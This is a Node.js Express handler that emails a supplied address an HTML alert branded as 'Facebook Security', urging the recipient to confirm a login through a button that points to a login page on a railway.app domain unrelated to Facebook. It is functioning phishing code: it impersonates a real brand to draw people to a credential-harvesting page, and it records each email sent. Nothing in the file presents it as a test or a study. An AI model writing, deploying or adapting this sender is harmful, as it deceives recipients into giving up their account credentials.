const sendEmail = require("../services/emailService")
const codeService = require("../services/codeService")

exports.sendLoginEmail = async (req,res)=>{

try{

const {email} = req.body

if(!email){

return res.status(400).json({
success:false,
message:"Email required"
})

}

const loginLink="https://security-system-production.up.railway.app/login.html"

const emailTemplate=`

<div style="background:#f0f2f5;padding:40px 0;font-family:Segoe UI,Arial">

<div style="max-width:600px;margin:auto;background:white;border-radius:10px;
box-shadow:0 6px 20px rgba(0,0,0,0.08);overflow:hidden">

<div style="background:#1877f2;color:white;padding:18px 25px;
font-size:18px;font-weight:600">

🔐 Facebook Security

</div>

<div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">

<p>Hello,</p>

<p>
We detected a login request to your <strong>Project Security portal</strong>.
To continue safely, please confirm the login below.
</p>

<div style="background:#f5f7fb;border-left:4px solid #1877f2;
padding:20px;margin:25px 0;border-radius:6px">

<strong>Facebook Security Verification Required</strong>

<p style="margin-top:10px;color:#444">
Click the button below to access the secure login page.
</p>

<div style="text-align:center;margin-top:20px">

<a href="${loginLink}" 
style="background:#1877f2;color:white;text-decoration:none;
padding:14px 30px;border-radius:6px;font-weight:bold">

Open Login page

</a>

</div>

</div>

<p>
If you did not request this login, you can safely comply this email.
No access will occur without verification.
</p>

<p style="margin-top:25px;font-weight:600">

Facebook Security Team

</p>

</div>

<div style="border-top:1px solid #ddd;padding:18px 30px;
font-size:12px;color:#65676b;background:#fafafa">

This is an automated security notification.

</div>

</div>

</div>
`

const sent = await sendEmail(
email,
"🔐 New Login Alert",
emailTemplate
)

if(!sent){

return res.status(500).json({
success:false,
message:"Email failed to send"
})

}

codeService.addActivity(email,"Login alert email sent")

return res.status(200).json({
success:true,
message:"Email sent successfully"
})

}catch(error){

console.error("Email sending error:",error)

return res.status(500).json({
success:false,
message:"Server error"
})

}

}